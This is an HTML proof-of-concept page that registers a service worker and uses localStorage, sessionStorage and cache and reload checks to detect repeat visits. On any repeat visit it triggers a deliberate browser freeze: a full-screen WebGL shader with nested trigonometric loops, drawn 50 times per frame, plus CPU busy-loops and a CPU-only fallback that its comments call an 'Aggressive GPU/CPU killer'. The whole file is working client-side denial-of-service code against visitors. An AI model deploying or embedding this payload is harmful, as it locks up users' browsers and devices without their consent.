<!DOCTYPE html>
<html>
<head>
    <title>SW Detection PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #1a1a2e;
            color: #eee;
        }
        #status {
            padding: 20px 40px;
            border-radius: 8px;
            margin: 20px;
            font-size: 24px;
            font-weight: bold;
        }
        .fresh { background: #16a34a; }
        .cached { background: #dc2626; }
        #info {
            max-width: 600px;
            text-align: center;
            line-height: 1.6;
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
    </style>
</head>
<body>
    <h1>Service Worker + Visit Detection PoC</h1>
    <div id="status">Checking...</div>
    <div id="info"></div>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // AGGRESSIVE DETECTION - Multiple Methods
        // ============================================

        const VISIT_KEY = '__poc_visited__';
        const SESSION_KEY = '__poc_session__';

        // Generate unique session ID
        function generateSessionId() {
            return Math.random().toString(36).substring(2) + Date.now().toString(36);
        }

        // Check if this is a duplicate/cached visit
        function isRepeatedVisit() {
            // Method 1: localStorage - tracks across all visits
            const hasVisited = localStorage.getItem(VISIT_KEY);

            // Method 2: sessionStorage - tracks within same tab session
            const currentSession = sessionStorage.getItem(SESSION_KEY);

            // Method 3: Service Worker controller check
            const swControlled = !!(navigator.serviceWorker && navigator.serviceWorker.controller);

            // Method 4: Performance API - transferSize = 0 means from cache
            let fromCache = false;
            if (window.performance) {
                const navEntries = performance.getEntriesByType('navigation');
                if (navEntries.length > 0 && navEntries[0].transferSize === 0) {
                    fromCache = true;
                }
            }

            // Method 5: Check if page was reloaded
            const isReload = performance.navigation ?
                (performance.navigation.type === 1) :
                (performance.getEntriesByType('navigation')[0]?.type === 'reload');

            console.log('[DETECTION]', {
                hasVisited: !!hasVisited,
                currentSession: !!currentSession,
                swControlled,
                fromCache,
                isReload
            });

            // AGGRESSIVE: Trigger on ANY of these conditions
            if (hasVisited) return { triggered: true, reason: 'localStorage: already visited' };
            if (swControlled && fromCache) return { triggered: true, reason: 'SW served from cache' };
            if (swControlled && isReload) return { triggered: true, reason: 'SW + page reload' };

            return { triggered: false, reason: 'fresh visit' };
        }

        // Mark as visited
        function markVisited() {
            localStorage.setItem(VISIT_KEY, Date.now().toString());
            sessionStorage.setItem(SESSION_KEY, generateSessionId());
        }

        // ============================================
        // WEBGL FREEZE - Aggressive GPU/CPU killer
        // ============================================

        function triggerFreeze() {
            const canvas = document.getElementById('canvas');
            canvas.style.zIndex = '9999';
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const gl = canvas.getContext('webgl2') ||
                       canvas.getContext('webgl') ||
                       canvas.getContext('experimental-webgl');

            if (!gl) {
                console.log('[FREEZE] WebGL not available, using CPU freeze');
                cpuFreeze();
                return;
            }

            console.log('[FREEZE] Starting WebGL freeze');

            // Vertex shader
            const vsSource = `
                attribute vec4 a_position;
                void main() {
                    gl_Position = a_position;
                }
            `;

            // AGGRESSIVE fragment shader - heavy math operations
            const fsSource = `
                precision highp float;
                uniform float u_time;
                uniform vec2 u_resolution;

                void main() {
                    vec2 uv = gl_FragCoord.xy / u_resolution;
                    float v = 0.0;

                    // Nested loops with heavy trig operations
                    for(int i = 0; i < 500; i++) {
                        for(int j = 0; j < 20; j++) {
                            float fi = float(i);
                            float fj = float(j);
                            v += sin(fi * u_time * 0.01) * cos(fj * u_time * 0.01);
                            v += tan(v * 0.001) * sin(uv.x * fi) * cos(uv.y * fj);
                            v = fract(v);
                        }
                    }

                    gl_FragColor = vec4(v, v * 0.5, v * 0.2, 1.0);
                }
            `;

            function createShader(gl, type, source) {
                const shader = gl.createShader(type);
                gl.shaderSource(shader, source);
                gl.compileShader(shader);
                if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                    console.error('Shader error:', gl.getShaderInfoLog(shader));
                    return null;
                }
                return shader;
            }

            const vs = createShader(gl, gl.VERTEX_SHADER, vsSource);
            const fs = createShader(gl, gl.FRAGMENT_SHADER, fsSource);

            if (!vs || !fs) {
                cpuFreeze();
                return;
            }

            const program = gl.createProgram();
            gl.attachShader(program, vs);
            gl.attachShader(program, fs);
            gl.linkProgram(program);

            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
                console.error('Program error:', gl.getProgramInfoLog(program));
                cpuFreeze();
                return;
            }

            gl.useProgram(program);

            // Create fullscreen quad
            const positions = new Float32Array([
                -1, -1,  1, -1,  -1, 1,
                -1,  1,  1, -1,   1, 1
            ]);

            const buffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);

            const posAttr = gl.getAttribLocation(program, 'a_position');
            gl.enableVertexAttribArray(posAttr);
            gl.vertexAttribPointer(posAttr, 2, gl.FLOAT, false, 0, 0);

            const timeUniform = gl.getUniformLocation(program, 'u_time');
            const resUniform = gl.getUniformLocation(program, 'u_resolution');

            gl.uniform2f(resUniform, canvas.width, canvas.height);

            let time = 0;

            // AGGRESSIVE render loop - multiple draws per frame
            function render() {
                time += 0.5;
                gl.uniform1f(timeUniform, time);

                // Draw multiple times per frame to max out GPU
                for (let i = 0; i < 50; i++) {
                    gl.drawArrays(gl.TRIANGLES, 0, 6);
                }

                // Also do some CPU work
                let x = 0;
                for (let i = 0; i < 100000; i++) {
                    x += Math.sin(i) * Math.cos(i);
                }

                requestAnimationFrame(render);
            }

            render();
        }

        // CPU-only freeze fallback
        function cpuFreeze() {
            console.log('[FREEZE] Starting CPU freeze');

            function burn() {
                const start = Date.now();
                while (Date.now() - start < 100) {
                    for (let i = 0; i < 1000000; i++) {
                        Math.sin(Math.random()) * Math.cos(Math.random()) * Math.tan(Math.random());
                    }
                }
                requestAnimationFrame(burn);
            }
            burn();
        }

        // ============================================
        // MAIN EXECUTION
        // ============================================

        // Register Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
                .then(reg => {
                    console.log('[SW] Registered:', reg.scope);
                    // Force update check
                    reg.update();
                })
                .catch(err => console.log('[SW] Registration failed:', err));
        }

        // Run detection after short delay
        setTimeout(() => {
            const statusEl = document.getElementById('status');
            const infoEl = document.getElementById('info');

            const result = isRepeatedVisit();

            if (!result.triggered) {
                // First visit - mark and allow
                markVisited();

                statusEl.textContent = 'FIRST VISIT - OK';
                statusEl.className = 'fresh';
                infoEl.innerHTML = `
                    <p><strong>Reason:</strong> ${result.reason}</p>
                    <p>This page has been marked as visited.</p>
                    <p><strong>Now try:</strong></p>
                    <ul style="text-align:left;">
                        <li>Reload this page (Ctrl+R / Cmd+R)</li>
                        <li>Open this URL in a new tab</li>
                        <li>Close and reopen the browser</li>
                    </ul>
                    <p>Any of these will trigger the freeze!</p>
                    <hr style="margin: 20px 0; border-color: #444;">
                    <p><small>To reset: Open DevTools → Application → Clear Storage</small></p>
                `;
            } else {
                // Repeated visit - FREEZE
                statusEl.textContent = 'REPEAT VISIT - FREEZING!';
                statusEl.className = 'cached';
                infoEl.innerHTML = `
                    <p><strong>Reason:</strong> ${result.reason}</p>
                    <p style="color: #f87171; font-size: 20px;">Triggering WebGL freeze NOW...</p>
                `;

                // Immediate freeze
                setTimeout(triggerFreeze, 500);
            }
        }, 500);
    </script>
</body>
</html>
